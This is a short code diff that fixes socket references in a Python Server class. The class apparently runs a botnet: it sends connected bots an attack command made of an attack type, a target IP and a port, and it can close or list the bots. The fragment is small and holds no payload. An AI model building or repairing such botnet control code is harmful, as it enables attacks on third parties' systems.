@@ -69,11 +69,11 @@ class Server:
                 else:
                     message = f"{self.attack}_{self.target_ip}_{self.target_port}"
 
-                socketfd.send(netbot.id, message.encode(), len(message),0)
+                self.socketfd.send(netbot.id, message.encode(), len(message),0)
 
     def close_connected_sockets(self):
         for netbot in netbots:
-            socketfd.close(netbot.id)
+            self.socketfd.close(netbot.id)
     
     def list_bots(self):
         os.system("clear")
